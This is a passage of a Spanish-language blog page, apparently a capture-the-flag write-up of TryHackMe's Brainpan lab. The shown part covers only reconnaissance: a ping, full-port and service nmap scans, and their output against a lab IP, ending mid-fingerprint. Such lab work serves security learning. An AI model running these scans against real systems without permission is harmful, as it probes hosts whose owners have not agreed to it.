@@ -1,0 +1,928 @@
+<!DOCTYPE html>
+<html lang="es" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Resolución de la Máquina Brainpain de TryHackMe.'>
+<title>Write Up Brainpain</title>
+
+<link rel='canonical' href='https://sx1v4n.github.io/p/brainpain-thm/'>
+
+<link rel="stylesheet" href="/scss/style.min.8191399262444ab68b72a18c97392f5349be20a1615d77445be51e974c144cff.css"><meta property='og:title' content='Write Up Brainpain'>
+<meta property='og:description' content='Resolución de la Máquina Brainpain de TryHackMe.'>
+<meta property='og:url' content='https://sx1v4n.github.io/p/brainpain-thm/'>
+<meta property='og:site_name' content='S.x1v4n'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2023-05-29T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2023-05-29T00:00:00&#43;00:00'/><meta property='og:image' content='https://sx1v4n.github.io/p/brainpain-thm/logo.png' />
+<meta name="twitter:title" content="Write Up Brainpain">
+<meta name="twitter:description" content="Resolución de la Máquina Brainpain de TryHackMe."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://sx1v4n.github.io/p/brainpain-thm/logo.png' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "dark");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/logo_hude82ea7f464a850aa72eb63e992f12f3_89784_300x0_resize_q75_box.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">S.x1v4n</a></h1>
+            <h2 class="site-description">Jr Penetration Tester / eJPTv2</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Sx1v4n'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <?xml version="1.0"?><svg fill="#FFFFFF" xmlns="http://www.w3.org/2000/svg"  viewBox="0 0 50 50" width="50px" height="50px">    <path d="M17.791,46.836C18.502,46.53,19,45.823,19,45v-5.4c0-0.197,0.016-0.402,0.041-0.61C19.027,38.994,19.014,38.997,19,39 c0,0-3,0-3.6,0c-1.5,0-2.8-0.6-3.4-1.8c-0.7-1.3-1-3.5-2.8-4.7C8.9,32.3,9.1,32,9.7,32c0.6,0.1,1.9,0.9,2.7,2c0.9,1.1,1.8,2,3.4,2 c2.487,0,3.82-0.125,4.622-0.555C21.356,34.056,22.649,33,24,33v-0.025c-5.668-0.182-9.289-2.066-10.975-4.975 c-3.665,0.042-6.856,0.405-8.677,0.707c-0.058-0.327-0.108-0.656-0.151-0.987c1.797-0.296,4.843-0.647,8.345-0.714 c-0.112-0.276-0.209-0.559-0.291-0.849c-3.511-0.178-6.541-0.039-8.187,0.097c-0.02-0.332-0.047-0.663-0.051-0.999 c1.649-0.135,4.597-0.27,8.018-0.111c-0.079-0.5-0.13-1.011-0.13-1.543c0-1.7,0.6-3.5,1.7-5c-0.5-1.7-1.2-5.3,0.2-6.6 c2.7,0,4.6,1.3,5.5,2.1C21,13.4,22.9,13,25,13s4,0.4,5.6,1.1c0.9-0.8,2.8-2.1,5.5-2.1c1.5,1.4,0.7,5,0.2,6.6c1.1,1.5,1.7,3.2,1.6,5 c0,0.484-0.045,0.951-0.11,1.409c3.499-0.172,6.527-0.034,8.204,0.102c-0.002,0.337-0.033,0.666-0.051,0.999 c-1.671-0.138-4.775-0.28-8.359-0.089c-0.089,0.336-0.197,0.663-0.325,0.98c3.546,0.046,6.665,0.389,8.548,0.689 c-0.043,0.332-0.093,0.661-0.151,0.987c-1.912-0.306-5.171-0.664-8.879-0.682C35.112,30.873,31.557,32.75,26,32.969V33 c2.6,0,5,3.9,5,6.6V45c0,0.823,0.498,1.53,1.209,1.836C41.37,43.804,48,35.164,48,25C48,12.318,37.683,2,25,2S2,12.318,2,25 C2,35.164,8.63,43.804,17.791,46.836z"/></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://www.linkedin.com/in/ivan-romero-capita-a56838256/'
+                        target="_blank"
+                        title="Linkedin"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg"  viewBox="0 0 48 48" width="48px" height="48px"><path fill="#0288D1" d="M42,37c0,2.762-2.238,5-5,5H11c-2.761,0-5-2.238-5-5V11c0-2.762,2.239-5,5-5h26c2.762,0,5,2.238,5,5V37z"/><path fill="#FFF" d="M12 19H17V36H12zM14.485 17h-.028C12.965 17 12 15.888 12 14.499 12 13.08 12.995 12 14.514 12c1.521 0 2.458 1.08 2.486 2.499C17 15.887 16.035 17 14.485 17zM36 36h-5v-9.099c0-2.198-1.225-3.698-3.192-3.698-1.501 0-2.313 1.012-2.707 1.99C24.957 25.543 25 26.511 25 27v9h-5V19h5v2.616C25.721 20.5 26.85 19 29.738 19c3.578 0 6.261 2.25 6.261 7.274L36 36 36 36z"/></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Inicio</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/writeups/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="ionicon" viewBox="0 0 512 512"><path d="M336 64h32a48 48 0 0148 48v320a48 48 0 01-48 48H144a48 48 0 01-48-48V112a48 48 0 0148-48h32" fill="none" stroke="currentColor" stroke-linejoin="round" stroke-width="32"/><rect x="176" y="32" width="160" height="64" rx="26.13" ry="26.13" fill="none" stroke="currentColor" stroke-linejoin="round" stroke-width="32"/></svg>
+                
+                <span>WriteUps</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/whoami/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="ionicon" viewBox="0 0 512 512"><path d="M344 144c-3.92 52.87-44 96-88 96s-84.15-43.12-88-96c-4-55 35-96 88-96s92 42 88 96z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="32"/><path d="M256 304c-87 0-175.3 48-191.64 138.6C62.39 453.52 68.57 464 80 464h352c11.44 0 17.62-10.48 15.65-21.4C431.3 352 343 304 256 304z" fill="none" stroke="currentColor" stroke-miterlimit="10" stroke-width="32"/></svg>
+                
+                <span>Whoami</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archivos/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archivo</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/brainpain-thm/">
+                <img src="/p/brainpain-thm/logo.png"
+                        
+                        width="1000" 
+                        height="667" 
+                        loading="lazy"
+                        alt="Featured image of post Write Up Brainpain" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/try-hack-me/" style="background-color: #f75151; color: #fff;">
+                TryHackMe
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/brainpain-thm/">Write Up Brainpain</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Resolución de la Máquina Brainpain de TryHackMe.
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">May 29, 2023</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>Comenzamos mirando que la máquina esté activa.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">ping</span> <span class="o">-</span><span class="n">c1</span> <span class="mf">10.10.173.74</span>           
+</span></span><span class="line"><span class="cl"><span class="n">PING</span> <span class="mf">10.10.173.74</span> <span class="p">(</span><span class="mf">10.10.173.74</span><span class="p">)</span> <span class="mi">56</span><span class="p">(</span><span class="mi">84</span><span class="p">)</span> <span class="nb">bytes</span> <span class="n">of</span> <span class="n">data</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="mi">64</span> <span class="nb">bytes</span> <span class="kn">from</span> <span class="mf">10.10.173.74</span><span class="p">:</span> <span class="n">icmp_seq</span><span class="o">=</span><span class="mi">1</span> <span class="n">ttl</span><span class="o">=</span><span class="mi">63</span> <span class="n">time</span><span class="o">=</span><span class="mf">47.3</span> <span class="n">ms</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">---</span> <span class="mf">10.10.173.74</span> <span class="n">ping</span> <span class="n">statistics</span> <span class="o">---</span>
+</span></span><span class="line"><span class="cl"><span class="mi">1</span> <span class="n">packets</span> <span class="n">transmitted</span><span class="p">,</span> <span class="mi">1</span> <span class="n">received</span><span class="p">,</span> <span class="mi">0</span><span class="o">%</span> <span class="n">packet</span> <span class="n">loss</span><span class="p">,</span> <span class="n">time</span> <span class="mi">0</span><span class="n">ms</span>
+</span></span><span class="line"><span class="cl"><span class="n">rtt</span> <span class="nb">min</span><span class="o">/</span><span class="n">avg</span><span class="o">/</span><span class="nb">max</span><span class="o">/</span><span class="n">mdev</span> <span class="o">=</span> <span class="mf">47.279</span><span class="o">/</span><span class="mf">47.279</span><span class="o">/</span><span class="mf">47.279</span><span class="o">/</span><span class="mf">0.000</span> <span class="n">ms</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Realizamos un reconocimiento de puertos.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">sudo</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sS</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">5000</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">vvv</span> <span class="mf">10.10.173.74</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">sudo</span><span class="p">]</span> <span class="n">contraseña</span> <span class="n">para</span> <span class="n">shadoow</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.93</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">27</span> <span class="mi">14</span><span class="p">:</span><span class="mi">35</span> <span class="n">CEST</span>
+</span></span><span class="line"><span class="cl"><span class="n">Initiating</span> <span class="n">Ping</span> <span class="n">Scan</span> <span class="n">at</span> <span class="mi">14</span><span class="p">:</span><span class="mi">35</span>
+</span></span><span class="line"><span class="cl"><span class="n">Scanning</span> <span class="mf">10.10.173.74</span> <span class="p">[</span><span class="mi">4</span> <span class="n">ports</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">Completed</span> <span class="n">Ping</span> <span class="n">Scan</span> <span class="n">at</span> <span class="mi">14</span><span class="p">:</span><span class="mi">35</span><span class="p">,</span> <span class="mf">0.09</span><span class="n">s</span> <span class="n">elapsed</span> <span class="p">(</span><span class="mi">1</span> <span class="n">total</span> <span class="n">hosts</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Initiating</span> <span class="n">SYN</span> <span class="n">Stealth</span> <span class="n">Scan</span> <span class="n">at</span> <span class="mi">14</span><span class="p">:</span><span class="mi">35</span>
+</span></span><span class="line"><span class="cl"><span class="n">Scanning</span> <span class="mf">10.10.173.74</span> <span class="p">[</span><span class="mi">65535</span> <span class="n">ports</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">10000</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10.173.74</span>
+</span></span><span class="line"><span class="cl"><span class="n">Discovered</span> <span class="nb">open</span> <span class="n">port</span> <span class="mi">9999</span><span class="o">/</span><span class="n">tcp</span> <span class="n">on</span> <span class="mf">10.10.173.74</span>
+</span></span><span class="line"><span class="cl"><span class="n">Completed</span> <span class="n">SYN</span> <span class="n">Stealth</span> <span class="n">Scan</span> <span class="n">at</span> <span class="mi">14</span><span class="p">:</span><span class="mi">36</span><span class="p">,</span> <span class="mf">12.98</span><span class="n">s</span> <span class="n">elapsed</span> <span class="p">(</span><span class="mi">65535</span> <span class="n">total</span> <span class="n">ports</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.173.74</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span><span class="p">,</span> <span class="n">received</span> <span class="n">echo</span><span class="o">-</span><span class="n">reply</span> <span class="n">ttl</span> <span class="mi">63</span> <span class="p">(</span><span class="mf">0.047</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">Scanned</span> <span class="n">at</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">27</span> <span class="mi">14</span><span class="p">:</span><span class="mi">35</span><span class="p">:</span><span class="mi">54</span> <span class="n">CEST</span> <span class="k">for</span> <span class="mi">12</span><span class="n">s</span>
+</span></span><span class="line"><span class="cl"><span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">65533</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">reset</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">PORT</span>      <span class="n">STATE</span> <span class="n">SERVICE</span>          <span class="n">REASON</span>
+</span></span><span class="line"><span class="cl"><span class="mi">9999</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">abyss</span>            <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">63</span>
+</span></span><span class="line"><span class="cl"><span class="mi">10000</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">snet</span><span class="o">-</span><span class="n">sensor</span><span class="o">-</span><span class="n">mgmt</span> <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">63</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Read</span> <span class="n">data</span> <span class="n">files</span> <span class="n">from</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/../</span><span class="n">share</span><span class="o">/</span><span class="n">nmap</span>
+</span></span><span class="line"><span class="cl"><span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="ow">in</span> <span class="mf">13.17</span> <span class="n">seconds</span>
+</span></span><span class="line"><span class="cl">           <span class="n">Raw</span> <span class="n">packets</span> <span class="n">sent</span><span class="p">:</span> <span class="mi">65648</span> <span class="p">(</span><span class="mf">2.888</span><span class="n">MB</span><span class="p">)</span> <span class="o">|</span> <span class="n">Rcvd</span><span class="p">:</span> <span class="mi">65591</span> <span class="p">(</span><span class="mf">2.624</span><span class="n">MB</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Con un escaneo mas exahustivo obtenemos mayor información.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p9999</span><span class="p">,</span><span class="mi">10000</span> <span class="mf">10.10.173.74</span>              
+</span></span><span class="line"><span class="cl"><span class="n">Starting</span> <span class="n">Nmap</span> <span class="mf">7.93</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">27</span> <span class="mi">14</span><span class="p">:</span><span class="mi">37</span> <span class="n">CEST</span>
+</span></span><span class="line"><span class="cl"><span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10.173.74</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.045</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">PORT</span>      <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">VERSION</span>
+</span></span><span class="line"><span class="cl"><span class="mi">9999</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">abyss</span><span class="err">?</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">fingerprint</span><span class="o">-</span><span class="n">strings</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="n">NULL</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="n">_</span><span class="o">|</span> <span class="n">_</span><span class="o">|</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="n">_</span><span class="o">|</span> <span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span> 
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="n">_</span><span class="o">|</span> <span class="n">_</span><span class="o">|</span> <span class="n">_</span><span class="o">|</span> <span class="n">_</span><span class="o">|</span> <span class="n">_</span><span class="o">|</span> <span class="n">_</span><span class="o">|</span> <span class="n">_</span><span class="o">|</span> <span class="n">_</span><span class="o">|</span> <span class="n">_</span><span class="o">|</span> <span class="n">_</span><span class="o">|</span> <span class="n">_</span><span class="o">|</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="n">_</span><span class="o">|</span> <span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="n">_</span><span class="o">|</span> <span class="n">_</span><span class="o">|</span> <span class="n">_</span><span class="o">|</span> <span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="n">_</span><span class="o">|</span> <span class="n">_</span><span class="o">|</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="p">[</span><span class="n">________________________</span> <span class="n">WELCOME</span> <span class="n">TO</span> <span class="n">BRAINPAN</span> <span class="n">_________________________</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_</span>    <span class="n">ENTER</span> <span class="n">THE</span> <span class="n">PASSWORD</span>
+</span></span><span class="line"><span class="cl"><span class="mi">10000</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="n">SimpleHTTPServer</span> <span class="mf">0.6</span> <span class="p">(</span><span class="n">Python</span> <span class="mf">2.7.3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">SimpleHTTP</span><span class="o">/</span><span class="mf">0.6</span> <span class="n">Python</span><span class="o">/</span><span class="mf">2.7.3</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Site</span> <span class="n">doesn</span><span class="s1">&#39;t have a title (text/html).</span>
+</span></span><span class="line"><span class="cl"><span class="mi">1</span> <span class="n">service</span> <span class="n">unrecognized</span> <span class="n">despite</span> <span class="n">returning</span> <span class="n">data</span><span class="o">.</span> <span class="n">If</span> <span class="n">you</span> <span class="n">know</span> <span class="n">the</span> <span class="n">service</span><span class="o">/</span><span class="n">version</span><span class="p">,</span> <span class="n">please</span> <span class="n">submit</span> <span class="n">the</span> <span class="n">following</span> <span class="n">fingerprint</span> <span class="n">at</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">cgi</span><span class="o">-</span><span class="nb">bin</span><span class="o">/</span><span class="n">submit</span><span class="o">.</span><span class="n">cgi</span><span class="err">?</span><span class="n">new</span><span class="o">-</span><span class="n">service</span> <span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">SF</span><span class="o">-</span><span class="n">Port9999</span><span class="o">-</span><span class="n">TCP</span><span class="p">:</span><span class="n">V</span><span class="o">=</span><span class="mf">7.93</span><span class="o">%</span><span class="n">I</span><span class="o">=</span><span class="mi">7</span><span class="o">%</span><span class="n">D</span><span class="o">=</span><span class="mi">5</span><span class="o">/</span><span class="mi">27</span><span class="o">%</span><span class="n">Time</span><span class="o">=</span><span class="mi">6471</span><span class="n">F981</span><span class="o">%</span><span class="n">P</span><span class="o">=</span><span class="n">x86_64</span><span class="o">-</span><span class="n">pc</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">NU</span>
+</span></span><span class="line"><span class="cl"><span class="n">SF</span><span class="p">:</span><span class="n">LL</span><span class="p">,</span><span class="mi">298</span><span class="p">,</span><span class="s2">&#34;_\|</span><span class="se">\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</span>
